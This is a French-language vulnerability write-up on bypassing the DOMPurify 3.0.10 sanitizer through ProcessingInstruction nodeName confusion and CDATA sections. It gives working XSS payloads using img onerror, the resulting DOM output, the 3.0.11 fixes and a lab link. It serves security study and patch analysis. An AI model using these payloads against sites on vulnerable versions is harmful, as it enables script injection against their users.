---
description: 22 mai 2024
---

# Dompurify 3.0.10 bypass - Confusion nodeName and CDATA

## Crédits

Cet article se base sur les recherches de [RyotaK](https://x.com/ryotkak) ([https://flatt.tech/research/posts/bypassing-dompurify-with-good-old-xml/](https://flatt.tech/research/posts/bypassing-dompurify-with-good-old-xml/)).

## Confusion nodeName

{% hint style="info" %}
Il est recommandé de consulter l'article précédent intitulé [dompurify-3.0.9-bypass-node-type-confusion.md](dompurify-3.0.9-bypass-node-type-confusion.md "mention"), avant de poursuivre la lecture.
{% endhint %}

La version 3.0.9 de Dompurify présente une vulnérabilité de contournement lorsqu'un contenu XML utilisant l'interface `ProcessingInstruction` est utilisé dans une page HTML. La version 3.0.10 corrige ce problème en ajoutant le masque `SHOW_PROCESSING_INSTRUCTION` lors du traitement des nœuds XML, permettant ainsi leur prise en compte.

Pour rappel, le format d'une telle instruction est le suivant :&#x20;

```xml
<?target data?>
```

Et l'exploitation de la vulnérabilité peut s'effectuer de cette manière :

```xml
<?xml-stylesheet ><img src=x onerror=alert(1)>?>
```

Puisque la version 3.0.9 de Dompurify n'analyse pas les instructions de traitement (processing instructions), et que l'interface le permet, l'utilisateur peut librement définir la cible (`target`) :

```javascript
let userContent= document.getElementById('userContent');
userContent.innerHTML = DOMPurify.sanitize("<?whatever ><img src=x onerror=alert(1)>?>", {PARSER_MEDIA_TYPE: 'application/xhtml+xml'});
```

Provoquant l'affichage de la boîte de dialogue :&#x20;

```html
<div id="userContent">
  <!--?whatever -->
  <img src="x" onerror="alert(1)">
  "?>"
</div>
```

Grâce au correctif, la version 3.0.10 de Dompurify analyse dorénavent les noeuds de type `ProcessingInstruction`.

Lorsque Dompurify analyse une balise, la bibliothèque d'assainissement récupère tout d'abord le nom de la balise à analyser en accédant à la propriété `nodeName` :&#x20;

```javascript
/* Now let's check the element's type and name */
const tagName = transformCaseFunc(currentNode.nodeName);
```

Puis vérifie que la balise rencontrée soit autorisée :&#x20;

```javascript
if (!ALLOWED_TAGS[tagName] || FORBID_TAGS[tagName]) {
}
```

Par défaut, les balises autorisées sont les suivantes :&#x20;

```javascript
const html$1 = freeze(['a', 'abbr', 'acronym', 'address', 'area', 'article', 'aside', 'audio', 'b', 'bdi', 'bdo', 'big', 'blink', 'blockquote', 'body', 'br', 'button', 'canvas', 'caption', 'center', 'cite', 'code', 'col', 'colgroup', 'content', 'data', 'datalist', 'dd', 'decorator', 'del', 'details', 'dfn', 'dialog', 'dir', 'div', 'dl', 'dt', 'element', 'em', 'fieldset', 'figcaption', 'figure', 'font', 'footer', 'form', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6', 'head', 'header', 'hgroup', 'hr', 'html', 'i', 'img', 'input', 'ins', 'kbd', 'label', 'legend', 'li', 'main', 'map', 'mark', 'marquee', 'menu', 'menuitem', 'meter', 'nav', 'nobr', 'ol', 'optgroup', 'option', 'output', 'p', 'picture', 'pre', 'progress', 'q', 'rp', 'rt', 'ruby', 's', 'samp', 'section', 'select', 'shadow', 'small', 'source', 'spacer', 'span', 'strike', 'strong', 'style', 'sub', 'summary', 'sup', 'table', 'tbody', 'td', 'template', 'textarea', 'tfoot', 'th', 'thead', 'time', 'tr', 'track', 'tt', 'u', 'ul', 'var', 'video', 'wbr']);
```

Pour un noeud de type `ProcessingInstructions`, la propriété `nodeName` retourne la valeur de la cible (`target`). Ainsi, pour contourner l'assainissement effectué par Dompurify en version 3.0.10, il suffit de renseigner une cible (`target`) présente dans la liste de balises autorisées, par exemple `<abbr>` (ou `<img>` comme l'a fait l'auteur de l'article originel) :&#x20;

```javascript
let userContent= document.getElementById('userContent');
userContent.innerHTML = DOMPurify.sanitize("<?abbr ><img src=x onerror=alert(1)>?>", {PARSER_MEDIA_TYPE: 'application/xhtml+xml'});
```

```html
<div id="userContent">
  <!--?abbr -->
  <img src="x" onerror="alert(1)">
  "?>"
</div>
```

## Character data (CDATA)

`CDATA` est une section dans un document XML où les données sont traitées comme du texte brut, ce qui signifie que les balises et les entités spéciales à l'intérieur de cette section ne sont pas interprétées comme du code XML mais comme du texte. Cela permet d'inclure des caractères qui pourraient autrement être interprétés comme des balises ou des entités XML.

Une section `CDATA` commence par `<![CDATA[` et se termine par `]]>`. Voici un exemple :&#x20;

```xml
<![CDATA[Ceci est du texte.]]>
```

Le contournement de la version 3.0.9 était dû à l'absence de filtre pour prendre en compte l'interface `ProcessingInstruction`. Il en va de même pour les sections `CDATA` :

```javascript
let userContent= document.getElementById('userContent');
userContent.innerHTML = DOMPurify.sanitize("<![CDATA[ ><img src=x onerror=alert(1) ]]>", {PARSER_MEDIA_TYPE: 'application/xhtml+xml'});
```

```html
<div id="userContent">
  <!--[CDATA[ -->
  <img src="x" onerror="alert(1)" ]]>
</div>
```

A noter que la variante suivante semble fonctionner également :&#x20;

```javascript
let userContent= document.getElementById('userContent');
userContent.innerHTML = DOMPurify.sanitize("<![CDATA[ ><img src=x onerror=alert(1)>", {PARSER_MEDIA_TYPE: 'application/xhtml+xml'});
```

```html
<div id="userContent">
  <!--[CDATA[ -->
  <img src="x" onerror="alert(1)">
  "]]>"
</div>
```

## Corrections

Concernant l'interface `ProcessingInstruction`, Dompurify 3.0.11 a décidé de supprimer toutes les occurrences d'instructions de traitement :

```javascript
/* Remove any ocurrence of processing instructions */
if (currentNode.nodeType === 7) {
  _forceRemove(currentNode);
  return true;
}
```

Pour les sections `CDATA`, l'ajout du filtre `NodeFilter.SHOW_CDATA_SECTION` permet de détecter correctement leur utilisation. Étant donné que la valeur de la propriété `nodeName` d'une telle section est `#cdata-section`, qui n'est pas une balise autorisée par défaut, le contournement n'est plus possible.

```javascript
const _createNodeIterator = function _createNodeIterator(root) {
  return createNodeIterator.call(root.ownerDocument || root, root,
  // eslint-disable-next-line no-bitwise
  NodeFilter.SHOW_ELEMENT | NodeFilter.SHOW_COMMENT | NodeFilter.SHOW_TEXT | NodeFilter.SHOW_PROCESSING_INSTRUCTION | NodeFilter.SHOW_CDATA_SECTION, null);
};
```

## Labs

Afin de tester et d'exploiter ce contournement, une image Docker est disponible [ici](https://github.com/Sharpforce/cybersecurity-code/tree/master/dompurify-3.0.10-bypass-confusion-nodename-and-cdata).
